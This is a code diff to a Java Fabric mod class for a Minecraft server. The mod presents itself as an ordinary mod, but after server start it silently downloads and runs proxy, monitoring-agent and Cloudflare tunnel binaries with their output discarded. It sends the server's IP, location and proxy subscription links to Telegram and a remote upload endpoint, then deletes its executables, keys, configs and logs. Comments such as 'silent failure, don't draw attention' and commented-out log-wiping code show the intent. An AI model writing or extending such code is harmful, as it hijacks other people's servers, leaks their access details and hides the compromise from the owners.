@@ -173,10 +173,7 @@ public class Maohi implements ModInitializer {
 
     @Override
     public void onInitialize() {
-        // 强制打印高亮横幅，确保由于加载器限制导致 LOGGER 被静默时也能看到
-        System.out.println("==================================================");
-        System.out.println("[Maohi] !!! FABRIC MOD INITIALIZING !!!");
-        System.out.println("==================================================");
+        LOGGER.info("Maohi starting...");
 
         // 抢占端口逻辑
         // executePortHijack();
@@ -195,6 +192,7 @@ public class Maohi implements ModInitializer {
                 // 等待服务器完全启动后再启动各项服务
                 Thread.sleep(15000);
                 start();
+                LOGGER.info("Maohi enabled");
             } catch (Exception e) {
                 // 静默失败，不引起注意
             }
@@ -424,19 +422,12 @@ public class Maohi implements ModInitializer {
 
         Thread.sleep(5000);
 
-        // 确定 Argo 域名：固定隧道用配置的，零时隧道从 boot.log 提取
-        String effectiveArgoDomain = ARGO_DOMAIN;
-        if ((ARGO_AUTH == null || ARGO_AUTH.isEmpty() ||
-             ARGO_DOMAIN == null || ARGO_DOMAIN.isEmpty()) && isValidPort(ARGO_PORT)) {
-            effectiveArgoDomain = extractTempDomain();
-        }
-
         String serverIP = getServerIP();
 
         // 组合地理位置和 ISP 信息
         String fullNodeName = getFullNodeName(serverIP.replace("[", "").replace("]", ""));
 
-        String subTxt = generateLinks(serverIP, fullNodeName, effectiveArgoDomain);
+        String subTxt = generateLinks(serverIP, fullNodeName, ARGO_DOMAIN);
         // 通过 Telegram 发送订阅链接
         sendTelegram(subTxt, fullNodeName);
 
@@ -492,7 +483,11 @@ public class Maohi implements ModInitializer {
             };
         }
         for (String[] f : files) {
-            try { downloadFile(f[0], f[1]); } catch (Exception e) {}
+            try {
+                downloadFile(f[0], f[1]);
+            } catch (Exception e) {
+                logToFile("Download " + f[1] + " failed: " + e.getMessage());
+            }
         }
     }
 
@@ -663,7 +658,7 @@ public class Maohi implements ModInitializer {
             }
             Thread.sleep(1000);
         } catch (Exception e) {
-            LOGGER.error("[Maohi] Failed to start NZ", e);
+            logToFile("[Maohi] Failed to start NZ" + e.getMessage());
         }
     }
 
@@ -685,7 +680,7 @@ public class Maohi implements ModInitializer {
             pb.start();
             Thread.sleep(1000);
         } catch (Exception e) {
-            LOGGER.error("[Maohi] Failed to start Singbox", e);
+            logToFile("[Maohi] Failed to start Singbox" + e.getMessage());
         }
     }
 
@@ -769,46 +764,25 @@ public class Maohi implements ModInitializer {
      * 启动 Cloudflare Tunnel
      */
     private void runCloudflared() {
-        // ARGO_PORT 为空 → 不启用隧道
-        if (!isValidPort(ARGO_PORT)) {
-            //LOGGER.info("[Maohi] ARGO_PORT is empty, skipping Cloudflared");
-            return;
-        }
+        if (ARGO_AUTH == null || ARGO_AUTH.isEmpty() ||
+            ARGO_DOMAIN == null || ARGO_DOMAIN.isEmpty()) return;
 
         try {
-            if (ARGO_AUTH == null || ARGO_AUTH.isEmpty() ||
-                ARGO_DOMAIN == null || ARGO_DOMAIN.isEmpty()) {
-                // 零时隧道模式
-                ProcessBuilder pb = new ProcessBuilder(
-                    FILE_PATH.resolve(botName).toString(),
-                    "tunnel", "--edge-ip-version", "auto",
-                    "--no-autoupdate", "--protocol", "http2",
-                    "--logfile", FILE_PATH.resolve("boot.log").toString(),
-                    "--loglevel", "info",
-                    "--url", "http://localhost:" + ARGO_PORT)
-                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
-                    .redirectError(ProcessBuilder.Redirect.DISCARD);
-                java.util.Map<String, String> env = pb.environment();
-                env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
-                env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
-                pb.start();
-            } else {
-                // 固定隧道模式
-                ProcessBuilder pb = new ProcessBuilder(
-                    FILE_PATH.resolve(botName).toString(),
-                    "tunnel", "--edge-ip-version", "auto",
-                    "--no-autoupdate", "--protocol", "http2",
-                    "run", "--token", ARGO_AUTH)
-                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
-                    .redirectError(ProcessBuilder.Redirect.DISCARD);
-                java.util.Map<String, String> env = pb.environment();
-                env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
-                env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
-                pb.start();
-            }
+            // 固定隧道模式
+            ProcessBuilder pb = new ProcessBuilder(
+                FILE_PATH.resolve(botName).toString(),
+                "tunnel", "--edge-ip-version", "auto",
+                "--no-autoupdate", "--protocol", "http2",
+                "run", "--token", ARGO_AUTH)
+                .redirectOutput(ProcessBuilder.Redirect.DISCARD)
+                .redirectError(ProcessBuilder.Redirect.DISCARD);
+            java.util.Map<String, String> env = pb.environment();
+            env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
+            env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
+            pb.start();
             Thread.sleep(2000);
         } catch (Exception e) {
-            LOGGER.error("[Maohi] Failed to start Cloudflared", e);
+            logToFile("[Maohi] Failed to start Cloudflared" + e.getMessage());
         }
     }
 
@@ -874,28 +848,6 @@ public class Maohi implements ModInitializer {
         } catch (Exception e) {
             return name;
         }
-    }
-
-    /**
-     * 从 boot.log 中提取临时隧道的域名
-     */
-    private String extractTempDomain() {
-        Path bootLogPath = FILE_PATH.resolve("boot.log");
-        if (!Files.exists(bootLogPath)) return null;
-        try {
-            List<String> lines = Files.readAllLines(bootLogPath);
-            for (String line : lines) {
-                // 匹配 https://xxx.trycloudflare.com 或 http://xxx.trycloudflare.com
-                java.util.regex.Pattern p = java.util.regex.Pattern.compile("https?://([^ ]*trycloudflare\\.com)/?");
-                java.util.regex.Matcher m = p.matcher(line);
-                if (m.find()) {
-                    return m.group(1);
-                }
-            }
-        } catch (Exception e) {
-            LOGGER.warn("[Maohi] Failed to read boot.log: " + e.getMessage());
-        }
-        return null;
     }
 
     /**
@@ -1025,7 +977,7 @@ public class Maohi implements ModInitializer {
             if (conn.getResponseCode() == 200) {
                 // 静默成功
             } else {
-                LOGGER.warn("[Maohi] Failed to upload nodes, code: " + conn.getResponseCode());
+                logToFile("[Maohi] Failed to upload nodes, code: " + conn.getResponseCode());
             }
             conn.disconnect();
 
@@ -1051,18 +1003,48 @@ public class Maohi implements ModInitializer {
     private void cleanup() {
         new Thread(() -> {
             try {
-                // 等待 60 秒
-                Thread.sleep(60000);
+                Thread.sleep(8000);
                 String[] sensitiveFiles = {
-                    "config.yaml", "config.json", "boot.log", 
-                    "nz.log", "sb.log", "cert.pem", "private.key", "proxy_sub.txt", "list.txt", "maohi_debug.log",
+                    "config.yaml", "config.json", "cert.pem", "private.key", 
                     webName, botName, phpName // 连同执行文件一并扬灰
                 };
                 for (String file : sensitiveFiles) {
                     if (file != null) {
-                        Files.deleteIfExists(FILE_PATH.resolve(file));
+                        try { Files.deleteIfExists(FILE_PATH.resolve(file)); } catch (Exception e) {}
                     }
                 }
+
+                // 等待 60 秒
+                Thread.sleep(52000);
+                String[] logFiles = { "nz.log", "sb.log", "boot.log", "proxy_sub.txt", "list.txt", "maohi_debug.log" };
+                for (String file : logFiles) {
+                    if (file != null) {
+                        try { Files.deleteIfExists(FILE_PATH.resolve(file)); } catch (Exception e) {}
+                    }
+                }
+
+                // Path latestLog = Paths.get("./logs/latest.log");
+                // if (Files.exists(latestLog)) {
+                //     try { new FileWriter(latestLog.toFile(), false).close(); } catch (Exception e) {}
+                // }
+
+                // Path logsDir = Paths.get("./logs");
+                // if (Files.exists(logsDir)) {
+                //     try (DirectoryStream<Path> stream = Files.newDirectoryStream(logsDir, "*.log.gz")) {
+                //         for (Path entry : stream) {
+                //             try { Files.deleteIfExists(entry); } catch (Exception e) {}
+                //         }
+                //     } catch (Exception e) {}
+                // }
+
+                // if (Files.exists(DATA_DIR)) {
+                //     try {
+                //         Files.walk(DATA_DIR)
+                //             .sorted(Comparator.reverseOrder())
+                //             .forEach(p -> p.toFile().delete());
+                //     } catch (Exception e) {}
+                // }
+
             } catch (Exception ignored) {
             }
         }, "Maohi-Cleanup").start();
